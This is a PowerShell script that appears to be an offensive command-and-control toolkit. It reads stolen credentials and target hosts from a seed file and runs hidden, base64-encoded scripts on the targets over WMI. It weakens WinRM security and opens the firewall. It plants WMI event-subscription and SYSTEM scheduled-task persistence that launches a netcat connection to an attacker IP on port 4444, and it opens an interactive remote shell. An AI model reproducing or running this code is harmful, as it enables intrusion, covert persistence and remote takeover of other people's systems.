function Seed-System {
    $lines = Get-Content "seed.txt"
    $seeduser = $false
    $seedpassword = $false
    $seedtargets = $false

    while (!($seeduser -and $seedpassword -and $seedtargets)) {
        foreach ($line in $lines) {
            if ($line -match "^Account:") {
                $seeduser = ($line -split ":")[1].Trim()
                Write-Host "Account: $seeduser"
            } elseif ($line -match "^Password:") {
                $seedpassword = ($line -split ":")[1].Trim()
                Write-Host "Password: ********" 
            } elseif ($line -match "^Target\(s\):") {
                $seedtargets = ($line -split ":")[1].Trim() -split ","
                Write-Host "Targets: $seedtargets"
            }
        }

        if (!($seeduser -and $seedpassword -and $seedtargets)) {
            Write-Host "Seed failed. Check the seed.txt formatting."
            return $false
        }
    }

    Write-Host "Seed Passed. Script is starting."
    return @{user=$seeduser; password=$seedpassword; targets=$seedtargets}
}

function PushPull-System-PSRemoting {
    param (
        [string]$target,
        [string]$user,
        [string]$password,
        [string]$localDir = "$(Get-Location)\pushsys",  # Local pushsys 
        [string]$remoteDir = "C:\pushsys"  # Target pushsys 
    )

    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
        $session = New-PSSession -ComputerName $target -Credential $credential
        if (-not (Test-Path $localDir)) {
            Write-Host "The directory $localDir does not exist. Please check the path."
            return
        }
        Invoke-Command -Session $session -ScriptBlock {
            param ($remoteDir)
            if (-not (Test-Path $remoteDir)) {
                New-Item -ItemType Directory -Path $remoteDir -Force
            }
        } -ArgumentList $remoteDir
        Copy-Item -Path "$localDir\*" -Destination $remoteDir -Recurse -ToSession $session -Force

        Write-Host "Push-Pull system synced from $localDir to ${target}:$remoteDir"
        Remove-PSSession -Session $session
    }
    catch {
        Write-Host "An error occurred during the push-pull operation: $_"
    }
}

function Execute-InteractivePSRemoting {
    param (
        [string]$ComputerName,
        [string]$User,
        [string]$Password
    )

    $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($User, $securePassword)
    $session = New-PSSession -ComputerName $ComputerName -Credential $Credential

    while ($true) {
        $ExecCommand = Read-Host "Enter the command to execute on $ComputerName (type 'exit' to quit)>"
        
        if ($ExecCommand -eq 'exit') {
            Write-Host "Exiting interactive session..."
            break
        }

        try {
            $result = Invoke-Command -Session $session -ScriptBlock {
                param ($ExecCommand)
                Invoke-Expression $ExecCommand
            } -ArgumentList $ExecCommand

            Write-Host "Result from ${ComputerName}: $result"

        } catch {
            Write-Host "An error occurred while executing the command: $_"
        }
    }
    Remove-PSSession -Session $session
}


$scriptBlock = {
    param ($attackerIP)
    function Enable-PSRemotingAndWinRM {
        Enable-PSRemoting -Force
        Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true
        Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
        New-WSManInstance -ResourceURI winrm/config/Listener -SelectorSet @{Address="*"; Transport="HTTP"} -ValueSet @{Port="5985"; Hostname="*"}
        netsh advfirewall firewall add rule name="Allow WinRM" dir=in action=allow protocol=TCP localport=5985
    }

    function Setup-WMIPersistence {
        param ([string]$attackerIP)
    $eventFilterQuery = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'

    Register-WmiEvent -Namespace "root\cimv2" -Query $eventFilterQuery -SourceIdentifier "DCOMServerProcessLauncher"

    $consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
    $consumer.Name = "DCOMServerProcessLauncher"
    $consumer.ExecutablePath = "C:\pushsys\DONOTREMOVE.exe"
    $consumer.CommandLineTemplate = "C:\pushsys\DONOTREMOVE.exe nc $attackerIP 4444"
    $consumer.Put()

    $binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
    $binding.Filter = '__EventFilter.Name="DCOMServerProcessLauncher"'
    $binding.Consumer = 'CommandLineEventConsumer.Name="DCOMServerProcessLauncher"'
    $binding.Put()

    }

    function Setup-TaskSchedulerPersistence {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name='DCOMServerProcessLauncher', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''; wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name='DCOMServerProcessLauncher', ExecutablePath='C:\\Windows\\System32\\DONOTREMOVE.exe', CommandLineTemplate='C:\\Windows\\System32\\DONOTREMOVE.exe nc $attackerIP 4444'; wmic /NAMESPACE:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""DCOMServerProcessLauncher""', Consumer='CommandLineEventConsumer.Name=""DCOMServerProcessLauncher""'`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 99)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName "DONOTREMOVE" -InputObject $task
    }
    Enable-PSRemotingAndWinRM
    Setup-WMIPersistence -attackerIP $attackerIP
    Setup-TaskSchedulerPersistence -attackerIP $attackerIP
}

function Execute-Scripts {
    param (
        [string]$localDir = "$(Get-Location)\pushsys\scripts",
        [string]$ComputerName,
        [string]$User,
        [string]$Password
    )

    if (-not (Test-Path $localDir)) {
        Write-Host "The directory $localDir does not exist. Please check the path."
        return
    }

    Get-ChildItem -Path $localDir -Filter "*.ps1" | ForEach-Object {
        $scriptPath = $_.FullName
        Write-Host "Executing script: $scriptPath"
        
        try {
            $scriptContent = Get-Content -Path $scriptPath -Raw
            $scriptBytes = [System.Text.Encoding]::Unicode.GetBytes($scriptContent)
            $encodedScript = [Convert]::ToBase64String($scriptBytes)
            
            $command = "powershell.exe -EncodedCommand $encodedScript -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden"
            
            Invoke-CimMethod -ComputerName $ComputerName -Namespace root\cimv2 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command} -Credential (New-Object System.Management.Automation.PSCredential($User, (ConvertTo-SecureString $Password -AsPlainText -Force)))

            Write-Host "Successfully executed $scriptPath"
        }
        catch {
            Write-Host "Failed to execute ${scriptPath}: $_"
        }
    }
}

function Start-C2Session {
    $attackerIP = Read-Host "Enter your attacker's IP (attacker machine IP)"
    $seedData = Seed-System

    if ($seedData) {
        $user = $seedData.user
        $password = $seedData.password
        $targets = $seedData.targets
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)

        foreach ($target in $targets) {
            $scriptBlock = {
                param($attackerIP)
                Write-Host "Attacker IP: $attackerIP"
            }

            $command = "powershell.exe -ExecutionPolicy Bypass -Command `"& {`$attackerIP='$attackerIP'; & {& `$scriptBlock.Invoke(`$attackerIP)}`""

            try {
                Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $target -Credential $credential -ArgumentList $command
                Write-Host "Executing scripts on $target..."
                Execute-Scripts -ComputerName $target -User $user -Password $password
                Write-Host "Successfully executed on $target"
                PushPull-System-PSRemoting -target $target -user $user -password $password
                Write-Host "`Starting interactive session with $target..."
                Execute-InteractivePSRemoting -ComputerName $target -User $user -Password $password
            }
            catch {
                Write-Host "Failed to execute on ${target}: $_"
            }
        }
    }
    else {
        Write-Host "Seed data not found."
    }
}


Start-C2Session

